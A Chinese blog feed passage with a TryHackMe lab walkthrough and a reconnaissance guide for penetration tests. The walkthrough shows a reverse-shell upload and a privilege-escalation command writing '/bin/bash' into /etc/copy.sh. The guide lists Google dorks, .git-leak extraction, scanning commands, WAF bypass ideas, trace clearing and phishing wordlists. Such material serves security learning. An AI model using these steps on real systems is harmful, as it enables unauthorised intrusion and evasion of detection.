alt="image-20240402083725480"></p><p>可以看到一个主题页，日志页，图片页，还有登陆页面等等，这里逐个看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154428.png" alt="image-20240402083839964"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154887.png" alt="image-20240402083853435"></p><p>这些文件随便点开几个都是空白，暂时不管他</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154003.png" alt="image-20240402083956631"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154199.png" alt="image-20240402084037160"></p><p>随便看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154254.png" alt="image-20240402084256255"></p><p>在这里有一个序列化过的字符串，可以看出这是一个被加密的密码，我们进行解密</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154375.png" alt="image-20240402084403711"></p><p>得到了密码</p><p>那我们直接去登陆看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154437.png" alt="image-20240402084646617"></p><p>打开发现根本不能登录，这里怀疑是不是没扫出来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154515.png" alt="image-20240402091307697"></p><p>扫到一个as，打开一看果然是登陆界面</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154540.png" alt="image-20240402091337907"></p><p>用上我们刚才找到的用户名密码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154830.png" alt="image-20240402091433142"></p><p>成功进入后台</p><p>这里记录下关键信息</p><p>这是sweetrice 1.5.1</p><p>然后插件列表处有个可以文件上传的点</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154952.png" alt="image-20240402091856220"></p><p>这里我们先看看这个cms有没有什么漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154974.png" alt="image-20240402091949839"></p><p>可以看到有文件上传，文件下载，csrf的洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154013.png" alt="image-20240402092221470"></p><p>我们把poc下载下来</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154044.png" alt="image-20240402092245333"></p><p>看看代码，要求我们填网址，账号密码，还有要上传的文件</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154111.png" alt="image-20240402093259558"></p><p>不知道为什么上传不上去，换个办法</p><p>在网上找了个反弹shell</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/133470236">反弹shell脚本（php-reverse-shell）_php-reverse-shell.-CSDN博客</a></p><p>改一下ip，端口即可</p><p>然后自己上传</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154483.png" alt="image-20240402094053009"></p><p>然后到&#x2F;content&#x2F;inc&#x2F;ads点一下触发</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154510.png" alt="image-20240402094131962"></p><p>成功进入</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154598.png" alt="image-20240402093931706"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154624.png" alt="image-20240402094157096"></p><p>find | grep user</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154645.png" alt="image-20240402094303909"></p><p>拿到第一个flag，后面就是进行提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154698.png" alt="image-20240402094421456"></p><p>发现我们只有两个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154067.png" alt="image-20240402114835268"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154069.png" alt="image-20240402122205157"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /etc/<span class="hljs-keyword">copy</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/perl /</span>home<span class="hljs-regexp">/itguy/</span>backup.pl<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154089.png" alt="image-20240402122432777"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408041154108.png" alt="image-20240402122413914"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试(一)</title>
    <link href="/2024/08/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <url>/2024/08/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试-一"><a href="#渗透测试-一" class="headerlink" title="渗透测试(一)"></a>渗透测试(一)</h1><p><strong>渗透测试流程</strong></p><p>渗透测试的整体流程：</p><ol><li>确定目标，方案（大多时候渗透测试是团队作战，有一个好的配合与方案才能事半功倍）</li><li>信息收集（好的信息收集能让渗透测试事半功倍）</li><li>WEB打点（根据前面收集好的信息进行漏洞利用并getshell）</li><li>后渗透（也就是内网阶段，内网又有内网的信息收集，横向移动等等）</li><li>痕迹清楚（你也不想被发现吧）</li><li>报告编写（最后的总结）</li></ol><h1 id="一-确定目标"><a href="#一-确定目标" class="headerlink" title="一.确定目标"></a>一.确定目标</h1><p>要针对下发的攻击手册研究主要得分点</p><p>个人电脑卫生，防止溯源</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二. 信息收集"></a>二. 信息收集</h1><h2 id="1-总起"><a href="#1-总起" class="headerlink" title="1. 总起"></a>1. 总起</h2><p>我们首先要理解信息收集的重要性<br>还有就是我们刚开始做的时候可能对着主域名xxx.com就开打了，这个很明显是不现实的，这种核心资产它的防御肯定是最好的，我们很可能打半天一点成果都没有，我们要抱着目的去做信息收集，我们做的是渗透测试，要测的是薄弱点，最薄弱的几乎都是边缘资产，但是边缘资产又不可能像主站那样一搜就出来，因此，我们要做信息收集。</p><p>一般来说，如果是参加攻防演练，会分发一个攻击方手册，上面会写出具体攻击的靶标单位是哪些，然后上面会给出防守方 ip 地址范围，或者是给出一个域名，我们就需要根据给出的资产做信息收集，有些时候如果测试目标是某些公司，我们也可以测试投资占比&gt;51%的子公司，具体情况根据要求来做。</p><p>SRC 挖掘中我们就要根据具体规则进行挖掘，比如 edusrc，我们更多时候可能就是看域名，xxx. edu. cn，这个时候大多数的信息收集方式就是靠子域名或是一些搜索引擎来进行收集；如果是企业 SRC 之类的我们就应该去看具体规则，这里举例几个企业的公告</p><p><a href="https://security.tencent.com/uploadimg_dir/other/TSRC.pdf?v=3.3">TSRC.pdf (tencent.com)</a></p><p><a href="https://src.zhaopin.com/page/view?id=10012">智联招聘安全应急响应中心（ZPSRC）安全漏洞处理标准V3.0 | 智联招聘安全应急响应中心 (zhaopin.com)</a></p><p><a href="https://q2a1fk6o03.feishu.cn/docx/WPOHdeVdLoJgPfx25VmcfVJxnde">🚀字节跳动安全响应中心安全报告处置规则V6.0 - 飞书云文档 (feishu.cn)</a></p><p>再者就是在公司或者 CTF，打靶中的信息收集，这些一般就是开扫，这里不详细说明。（有空再写）</p><p>在做以下步骤之前，推荐几个全套工具，我认为能满足信息收集的大部分要求</p><p>Tscanplus</p><ul><li><a href="https://github.com/TideSec/TscanPlus">TideSec&#x2F;TscanPlus: 一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202407181551022.png" alt="image.png"></li></ul><p>mitan</p><ul><li><a href="https://github.com/kkbo8005/mitan">kkbo8005&#x2F;mitan: 密探渗透测试工具包含资产信息收集，子域名爆破，搜索语法，资产测绘（FOFA，Hunter，quake, ZoomEye），指纹识别，敏感信息采集，文件扫描、密码字典等功能 (github.com)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202407181552662.png" alt="image.png"></li></ul><p>TangGo<br><a href="https://tanggo.nosugar.tech/">TangGo测试平台 (nosugar.tech)</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202407191932304.png" alt="image.png"></p><p>ARL灯塔（原删库了，这里推荐这个）<br><a href="https://github.com/Aabyss-Team/ARL">Aabyss-Team&#x2F;ARL: ARL官方仓库备份项目：ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 (github.com)</a></p><p>ShuiZe<br><a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p><p>rengine（据说吃电脑性能，但是功能很全）<br><a href="https://github.com/yogeshojha/rengine">yogeshojha&#x2F;rengine: reNgine is an automated reconnaissance framework for web applications with a focus on highly configurable streamlined recon process via Engines, recon data correlation and organization, continuous monitoring, backed by a database, and simple yet intuitive User Interface. reNgine makes it easy for penetration testers to gather reconnaissance with minimal configuration and with the help of reNgine’s correlation, it just makes recon effortless. (github.com)</a></p><h2 id="2-具体"><a href="#2-具体" class="headerlink" title="2. 具体"></a>2. 具体</h2><h3 id="第一步-归纳信息"><a href="#第一步-归纳信息" class="headerlink" title="第一步:归纳信息"></a>第一步:归纳信息</h3><p>我认为良好的第一步，其实从创建文件夹就开始了<br>前文也提到过，渗透测试大多以团队作战为主，这个时候我们就需要情报共享，所以我们需要挑选一个可以共同编辑的工具<br>这里我推荐语雀或是飞书<br>然后把靶标一个个列上，再加上我们需要收集的内容目录，方便后续快速翻看，也不容易出现打偏之类的现象<br>下面给出一个模板</p><ol><li>企业基础信息收集</li></ol><ul><li>目标企业信息</li><li>所属行业分类</li><li>股权结构信息</li></ul><ol start="2"><li>企业安全防护收集</li></ol><ul><li>供应商关系信息；软件供应链；安全供应商</li><li>防病毒产品</li><li>EDR产品</li><li>NTA产品</li><li>HIDS产品</li><li>SOC产品</li><li>安全运维</li><li>受哪家保护</li></ul><ol start="3"><li>企业互联网资产信息</li></ol><ul><li>互联网资产收集:子域名爆破，空间测绘，端口扫描，web识别</li><li>资产和组件识别：web资产，移动端资产，C&#x2F;S段资产</li><li>供应链资产识别:VPN，OA，Mail，云桌面，CRM，SRM等</li><li>敏感信息收集:邮箱，账号密码，泄露代码</li><li>资产脆弱性识别:供应链资产，框架CMS资产，组件资产</li></ul><ol start="4"><li>企业云上资产<br>打云的目的是要回到本地机房<br>（获取员工数据，获取应用服务器权限，应用沟通交流功能)</li></ol><h3 id="第二步-资产收集"><a href="#第二步-资产收集" class="headerlink" title="第二步:资产收集"></a>第二步:资产收集</h3><h4 id="i-企业资产"><a href="#i-企业资产" class="headerlink" title="i.企业资产"></a>i.企业资产</h4><p>首先我们要找的是这家企业的基本信息，这里给出</p><ul><li><p>零零信安<a href="https://0.zone/">零零信安 | ASM | 攻击面 | 外部攻击面管理专家 | 比攻击者更快一步了解您自己的风险 (0.zone)</a></p></li><li><p>企查查<a href="https://www.qcc.com/">企查查 - 企业工商信息查询系统_查企业_查老板_查风险就上企查查! (qcc.com)</a></p></li><li><p>爱企查<a href="https://aiqicha.baidu.com/">爱企查首页 - 专业企业查询平台 - 查企业 - 查老板 - 查风险 - 工商信息查询系统 (baidu.com)</a></p></li><li><p>天眼查<a href="https://www.tianyancha.com/">天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)</a></p></li><li><p>风鸟<a href="https://www.riskbird.com/">风鸟-免费企业查询平台-免费查企业-查失信-查法人-企业信用-工商查询 (riskbird.com)</a></p></li></ul><p>移动端资产：</p><ul><li><p>小蓝本<a href="https://sou.xiaolanben.com/pc">小蓝本-商业信息搜索 (xiaolanben.com)</a></p></li><li><p>七麦<a href="https://www.qimai.cn/">七麦数据 -专业移动产品商业分析平台-关键词优化-ASA优化-七麦科技 (qimai.cn)</a></p></li></ul><p>我们并不需要都用，我平时用得比较多的其实是风鸟（因为它送一年VIP），爱企查（信息比较全，比较直观），零零信安（收集很齐全，就是要钱）这些大多都是起到一个互补的作用，在这些网站中，我们需要重点关注：</p><ol><li>企业架构（集团其它成员，子公司，着重关注&gt;51%控股权的公司，在大部分情况中那些也在攻击目标范围内）</li><li>知识产权（网站备案号，软件著作，公众号，微信、支付宝小程序，APP）</li><li>邮箱（这一点感觉很多人会忽略，其实也有很大的作用）</li><li>网站图标（借助测绘的icon语法搜集网站）</li></ol><p>零零信安</p><p>风鸟</p><p>爱企查</p><p>如果要收集的靶标企业较多，也可以利用工具<br><strong>ENScanGo</strong><br><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><p>各大应用市场收集app</p><p>这里再提一个地方，维基百科或是百度百科，在一些大企业上会帮我们总结好信息，以及一些企业关系</p><h4 id="ii-子域名收集"><a href="#ii-子域名收集" class="headerlink" title="ii.子域名收集"></a>ii.子域名收集</h4><p>在获取一堆主域之后，就是找子域名(我这里仅是尽可能多的把我的思路列举出来，具体的使用根据个人习惯，没有要求说要按照流程走一遍，只要你认为你收集的资产足够你拿下目标就够了)</p><h5 id="a-备案号反查域名（适用国内）"><a href="#a-备案号反查域名（适用国内）" class="headerlink" title="a.备案号反查域名（适用国内）"></a>a.备案号反查域名（适用国内）</h5><p><a href="https://beian.miit.gov.cn/#/Integrated/index">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统 (miit.gov.cn)</a><br><a href="https://tool.chinaz.com/">站长工具 - 站长之家 (chinaz.com)</a><br><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a><br>奇安信的备案号反查做的很好</p><h5 id="b-工具爆破"><a href="#b-工具爆破" class="headerlink" title="b.工具爆破"></a>b.工具爆破</h5><p>字典文件[[子域名(18.5w)]]</p><h6 id="Oneforall"><a href="#Oneforall" class="headerlink" title="Oneforall"></a>Oneforall</h6><p><a href="https://github.com/shmilylty/OneForAll">shmilylty&#x2F;OneForAll: OneForAll是一款功能强大的子域收集工具 (github.com)</a><br>python Oneforall.py -d xxx.com<br>python Oneforall.py  -dl xxx.txt</p><h6 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h6><p><a href="https://github.com/projectdiscovery/subfinder">projectdiscovery&#x2F;subfinder: Fast passive subdomain enumeration tool. (github.com)</a></p><h6 id="layer"><a href="#layer" class="headerlink" title="layer"></a>layer</h6><p>字典很大，而且穷举加递归，除非你项目没蓝队而且比较大，个人感觉一般用不到，用也是放到vps慢慢跑</p><h5 id="c-DNS查询"><a href="#c-DNS查询" class="headerlink" title="c.DNS查询"></a>c.DNS查询</h5><p><a href="https://dnsdumpster.com/">DNSDumpster.com - dns recon and research, find and lookup dns records</a><br><a href="https://www.virustotal.com/gui/home/search">VirusTotal</a></p><h5 id="d-证书查询"><a href="#d-证书查询" class="headerlink" title="d.证书查询"></a>d.证书查询</h5><p>crt.sh<br><a href="https://crt.sh/">crt.sh | Certificate Search</a><br>censys<br><a href="https://censys.io/">https://censys.io/</a></p><h5 id="e-搜索引擎"><a href="#e-搜索引擎" class="headerlink" title="e.搜索引擎"></a>e.搜索引擎</h5><p>Google<br>site:xxxx.com<br>还可以用-来去掉不想要的子域名，例如：site:xxxx.com -www -vpn</p><p>fofa<br><a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a><br>hunter<br><a href="https://hunter.qianxin.com/">鹰图平台 (qianxin.com)</a></p><p>360quake<br><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a><br>风里雨里，我都在quake等你。个人中心输入邀请码“dJsltu”你我均可获得5,000长效积分哦，地址 quake.360.net</p><p>zoomeye<br><a href="https://www.zoomeye.org/">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(“钟馗之眼”)网络空间搜索引擎</a></p><h5 id="f-hosts碰撞"><a href="#f-hosts碰撞" class="headerlink" title="f.hosts碰撞"></a>f.hosts碰撞</h5><p>可能直接突破进内网<br><a href="https://xz.aliyun.com/t/9590?time__1311=n4+xnD0DuA57qxGqGNnmDUxYqHgDclEODzoD">利用HOSTS碰撞突破边界 - 先知社区 (aliyun.com)</a><br>Host_scan</p><h5 id="g-whois查询"><a href="#g-whois查询" class="headerlink" title="g.whois查询"></a>g.whois查询</h5><p>查询网站注册信息<br><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a><br><a href="https://tool.chinaz.com/">站长工具 - 站长之家 (chinaz.com)</a></p><ol><li><p>在社工库查询邮箱和手机号，若查到，可尝试登陆服务器商或域名商。  </p></li><li><p>利用注册人电话，邮箱等信息通过自由拼接组合成针对网站的社工字典。最后利用字典进行爆破或社工钓鱼，也可用过邮箱和手机号反查找到更多注册域名。  </p></li><li><p>DNS解析记录可以查ip,查NS、mx邮件交换记录。</p></li><li><p>MX记录是邮件服务交换记录，邮件服务经常搭建在目标办公网络，可以让快速我们定位目标核心区域并展开渗透。</p></li></ol><h5 id="h-威胁情报"><a href="#h-威胁情报" class="headerlink" title="h.威胁情报"></a>h.威胁情报</h5><p>打攻防演练的时候，个人认为这是最好用的子域名收集方式，因为这种打点方式不会打草惊蛇，拿别的一扫就黑名单了，很容易收集有误或者不全</p><ul><li><a href="https://ti.360.net/">https://ti.360.net/</a></li><li><a href="https://ti.dbappsecurity.com.cn/">安全星图平台 (dbappsecurity.com.cn)</a></li><li><a href="https://redqueen.tj-un.com/IntelHome.html">RedQueen威胁情报中心 (tj-un.com)</a></li><li><a href="https://www.antiycloud.com/#/antiy/index">https://www.antiycloud.com/#/antiy/index</a></li><li><a href="https://www.virustotal.com/gui/home/upload">VirusTotal - Home</a></li><li><a href="https://securitytrails.com/">SecurityTrails: Data Security, Threat Hunting, and Attack Surface Management Solutions for Security Teams</a></li></ul><h5 id="i-旁站-C段查询"><a href="#i-旁站-C段查询" class="headerlink" title="i.旁站&#x2F;C段查询"></a>i.旁站&#x2F;C段查询</h5><p>nmap -p 80,443,8080 -Pn xxx.xxx.xxx.0&#x2F;24<br>masscan -p 80,443,8080 -Pn –rate&#x3D;    xxx.xxx.xxx.0&#x2F;24</p><p>资产测绘<br>ip&#x3D;”xxx.xxx.xxx.0&#x2F;24”</p><h5 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h5><p><a href="http://tools.sbbbb.cn/url-ip/">URL &amp; IP 在线处理工具 (sbbbb.cn)</a></p><h5 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h5><h6 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a>EHole</h6><p><a href="https://github.com/EdgeSecurityTeam/EHole">EdgeSecurityTeam&#x2F;EHole: EHole(棱洞)3.0 重构版-红队重点攻击系统指纹探测工具 (github.com)</a><br>.\\ehole.exe finger -l .\\domains.txt -o output.xlsx</p><h6 id="Glass"><a href="#Glass" class="headerlink" title="Glass"></a>Glass</h6><p><a href="https://github.com/s7ckTeam/Glass">s7ckTeam&#x2F;Glass: Glass是一款针对资产列表的快速指纹识别工具，通过调用Fofa&#x2F;ZoomEye&#x2F;Shodan&#x2F;360等api接口快速查询资产信息并识别重点资产的指纹，也可针对IP&#x2F;IP段或资产列表进行快速的指纹识别。 (github.com)</a><br>python Glass.py -u <a href="http://www.s7ck.com/">http://www.s7ck.com</a>  &#x2F;&#x2F; 单url测试<br>python Glass.py -w url.txt  &#x2F;&#x2F; url文件内</p><h6 id="Finger"><a href="#Finger" class="headerlink" title="Finger"></a>Finger</h6><p><a href="https://github.com/EASY233/Finger">EASY233&#x2F;Finger: 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 (github.com)</a></p><ul><li>-u 对单个URL进行指纹识别</li><li>-f 对指定文件中的url进行批量指纹识别</li><li>-i 对ip进行fofa数据查询采集其web资产</li><li>-if 对指定文件中的ip批量调用fofa进行数据查询采集其web资产</li><li>-fofa 调用fofa api进行资产收集</li><li>-quake 调用360 quake进行资产收集</li><li>-o 指定输出方式默认不选择的话是xlsx格式，支持json，xls。</li></ul><p>还有一些在线的</p><h6 id="潮汐指纹"><a href="#潮汐指纹" class="headerlink" title="潮汐指纹"></a><strong>潮汐指纹</strong></h6><p><a href="http://finger.tidesec.com/">TideFinger 潮汐指纹 TideFinger 潮汐指纹 (tidesec.com)</a></p><h6 id="云悉指纹"><a href="#云悉指纹" class="headerlink" title="云悉指纹"></a><strong>云悉指纹</strong></h6><p><a href="https://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台 (yunsee.cn)</a></p><h3 id="第三步-敏感信息收集"><a href="#第三步-敏感信息收集" class="headerlink" title="第三步:敏感信息收集"></a>第三步:敏感信息收集</h3><h4 id="I-Github"><a href="#I-Github" class="headerlink" title="I.Github"></a>I.Github</h4><p>手工：<br><a href="https://docs.github.com/zh/search-github/searching-on-github/searching-for-repositories">搜索仓库 - GitHub 文档</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">in:</span> <span class="hljs-string">name</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#标题搜索含有关键字baidu</span><br><span class="hljs-attr">in:</span> <span class="hljs-string">descripton</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#仓库描述搜索含有关键字 </span><br><span class="hljs-attr">in:</span> <span class="hljs-string">readme</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#Readme文件搜素含有关键字</span><br><span class="hljs-attr">stars:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3000 </span><span class="hljs-string">baidu</span> <span class="hljs-comment">#stars数量大于3000的搜索关键字</span><br><span class="hljs-attr">stars:</span> <span class="hljs-number">1000</span><span class="hljs-string">.</span> <span class="hljs-number">.3000</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#stars数量大于1000小于3000的搜索关键字</span><br><span class="hljs-attr">forks:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">1000 </span><span class="hljs-string">baidu</span> <span class="hljs-comment">#forks数量大于1000的搜索关键字</span><br><span class="hljs-attr">forks:</span> <span class="hljs-number">1000</span><span class="hljs-string">.</span> <span class="hljs-number">.3000</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#forks数量大于1000小于3000的搜索关键字</span><br><span class="hljs-attr">size:</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5000 </span><span class="hljs-string">baidu</span> <span class="hljs-comment">#指定仓库大于5000k(5 M) 的搜索关键字</span><br><span class="hljs-attr">pushed:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">2019</span> <span class="hljs-bullet">-</span> <span class="hljs-number">02</span> <span class="hljs-bullet">-</span> <span class="hljs-number">12</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#发布时间大于2019 - 02 - 12 的搜索关键字</span><br><span class="hljs-attr">created:</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">2019</span> <span class="hljs-bullet">-</span> <span class="hljs-number">02</span> <span class="hljs-bullet">-</span> <span class="hljs-number">12</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#创建时间大于2019 - 02 - 12 的搜索关键字</span><br><span class="hljs-attr">user:</span> <span class="hljs-string">name</span> <span class="hljs-comment">#用户名搜素</span><br><span class="hljs-attr">license:</span> <span class="hljs-string">apache</span> <span class="hljs-bullet">-</span> <span class="hljs-number">2.0</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#明确仓库的 LICENSE 搜索关键字</span><br><span class="hljs-attr">language:</span> <span class="hljs-string">java</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#在java语言的代码中搜索关键字</span><br><span class="hljs-attr">user: baidu in:</span> <span class="hljs-string">name</span> <span class="hljs-string">baidu</span> <span class="hljs-comment">#组合搜索, 用户名baidu的标题含有baidu的</span><br></code></pre></td></tr></table></figure><p>工具：<br>GitDorker(动不动就sleep，感觉不如手工)<br>环境配置：<br>pip3 install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>指令：<br>python3 GitDorker.py -q xxxx.com -tf token.txt -d all.txt -o xxx</p><p>.git泄露<br>工具：GitHack<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>命令<br>python GitHack.py <a href="http://xxxx.com/.git/">http://xxxx.com/.git/</a></p><h4 id="II-Google-Hacking"><a href="#II-Google-Hacking" class="headerlink" title="II.Google Hacking"></a>II.Google Hacking</h4><p>一键网站：<br><a href="https://pentest-tools.com/information-gathering/google-hacking">https://pentest-tools.com/information-gathering/google-hacking</a></p><p>其它语句：<br>RCE:inurl:cmd | inurl:exec&#x3D; | inurl:query&#x3D; | inurl:code&#x3D; | inurl:do&#x3D; | inurl:run&#x3D; | inurl:read&#x3D; | inurl:ping&#x3D; inurl:&amp; site:example.com</p><p>API:filepicker_key api docs curl</p><h4 id="III-搜索引擎"><a href="#III-搜索引擎" class="headerlink" title="III.搜索引擎"></a>III.搜索引擎</h4><p>合理运用百度，微信搜索，跟googlehacking差不多</p><h4 id="IV-供应链"><a href="#IV-供应链" class="headerlink" title="IV.供应链"></a>IV.供应链</h4><p>zf采购网<br>招标投标公共服务平台<br>公共资源交易中心<br>这个可以通过去打有相同供应链的网站，找薄弱的，扒源码做代码审计</p><h4 id="V-目录扫描"><a href="#V-目录扫描" class="headerlink" title="V.目录扫描"></a>V.目录扫描</h4><p>dirsearch<br>python dirsearch.py -u<br>御剑</p><h4 id="VI-API接口"><a href="#VI-API接口" class="headerlink" title="VI.API接口"></a>VI.API接口</h4><p>插件：findsomething</p><h4 id="VII-WAF探测"><a href="#VII-WAF探测" class="headerlink" title="VII.WAF探测"></a>VII.WAF探测</h4><h5 id="WAF类型"><a href="#WAF类型" class="headerlink" title="WAF类型"></a>WAF类型</h5><h6 id="软件型"><a href="#软件型" class="headerlink" title="软件型"></a>软件型</h6><p>安装在服务器本地，对性能消耗比较多<br>安全狗<br>云锁<br>D盾<br>网防G01<br>护卫神<br>智创<br>宝塔<br>悬镜<br>ModSecurity</p><h6 id="硬件型"><a href="#硬件型" class="headerlink" title="硬件型"></a>硬件型</h6><p>放置在网络链路中<br>绿盟WAF<br>安恒明御<br>启明天清<br>长亭雷池<br>远江盛邦RayWAF<br>天融信TopWAF<br>深信服WAF<br>F5 Advanced WAF</p><h6 id="云上"><a href="#云上" class="headerlink" title="云上"></a>云上</h6><p>主流<br>阿里云盾<br>腾讯云<br>百度云<br>华为云<br>安全狗云<br>创宇盾<br>安恒玄武盾<br>奇安信网站卫士</p><p>肉眼看：<br><a href="https://cloud.tencent.com/developer/article/1872310">Waf识别工具和83个Waf拦截页面-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h5 id="云WAF绕过思路（类似绕CDN）"><a href="#云WAF绕过思路（类似绕CDN）" class="headerlink" title="云WAF绕过思路（类似绕CDN）"></a>云WAF绕过思路（类似绕CDN）</h5><h6 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h6><h6 id="域名历史DNS"><a href="#域名历史DNS" class="headerlink" title="域名历史DNS"></a>域名历史DNS</h6><h6 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h6><h6 id="全球ping"><a href="#全球ping" class="headerlink" title="全球ping"></a>全球ping</h6><h4 id="VIII-组件框架"><a href="#VIII-组件框架" class="headerlink" title="VIII.组件框架"></a>VIII.组件框架</h4><h4 id="信息收集阶段可能发现的漏洞"><a href="#信息收集阶段可能发现的漏洞" class="headerlink" title="信息收集阶段可能发现的漏洞"></a>信息收集阶段可能发现的漏洞</h4><p>文件泄漏</p><ul><li>svn泄漏</li><li>git泄漏</li><li>hg泄漏</li><li>CVS泄漏</li><li>Bazaar&#x2F;bzr泄漏</li><li>网站备份文件泄漏</li><li>WEB-INF&#x2F;web.xml泄漏</li><li>DS_Store泄漏</li><li>SWP泄漏</li><li>war泄漏</li><li>tomcat泄漏</li><li>IIS短文件名</li></ul><p>组件未授权</p><ul><li>Solr</li><li>swagger</li><li>javaMelody</li><li>RabbitMQ</li><li>Redis</li><li>Rsync</li><li>Kubernetes API Server</li><li>Jenkins</li><li>FTP</li><li>Druid</li><li>Dubbo</li><li>CouchDB</li><li>Atlassian Crowd</li><li>Active MQ</li><li>Docker Registry API</li><li>MongoDB</li><li>Memcache</li><li>Elasticsearch</li><li>Zookeeper</li><li>phpinfo</li><li>目录遍历</li><li>spring 